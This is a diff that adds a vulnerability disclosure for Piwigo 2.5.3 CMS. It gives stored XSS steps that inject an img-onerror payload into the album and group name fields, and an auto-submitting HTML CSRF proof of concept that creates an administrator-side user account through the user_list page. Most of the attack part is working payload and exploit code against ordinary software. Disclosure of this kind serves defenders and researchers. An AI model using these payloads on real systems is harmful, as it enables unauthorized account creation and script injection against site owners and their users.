@@ -1,0 +1,47 @@
+###########################################################
+[~] Exploit Title: Piwigo 2.5.3 CMS:Multiple vulnerability's
+[~] Author: sajith
+[~] version: Piwigo 2.5.3
+[~]Vendor Homepage: http://piwigo.org
+[~] vulnerable app link:http://www.piwigo.org/basics/downloads
+###########################################################
+
+
+[1] Stored XSS on Multiple parameters
+
+    <1> click on Add photos (
+http://127.0.0.1/cms/piwigo/admin.php?page=photos_add) and click on "create
+new album" in the album name enter the payload "><img src=x
+onerror=prompt(1);> and save it we can see that our payload gets
+executed.we can also see that when you click on "albums" and "manage"
+functionality payload gets executed.
+
+
+    <2>click on users > groups > in the "group name" field add above xss
+payload and click on save.
+
+
+[2] CSRF vulnerability
+
+
+    click on >users >manage  where "add a user " functionality can be
+exploited using CSRF vulnerability(poc shown below)
+
+
+<head>
+<title>POC by sajith shetty</title>
+</head>
+<body>
+<form action="http://127.0.0.1/cms/piwigo/admin.php?page=user_list"
+id="formid" method="post">
+<input type="hidden" name="login" value="crsfpoc123" />
+<input type="hidden" name="password" value="Password123@" />
+<input type="hidden" name="email" value="xyz@aaww.com" />
+<input type="hidden" name="send_password_by_mail" value="1" />
+<input type="hidden" name="submit_add" value="Submit" />
+</form>
+<script>
+document.getElementById('formid').submit();
+</script>
+</body>
+</html>
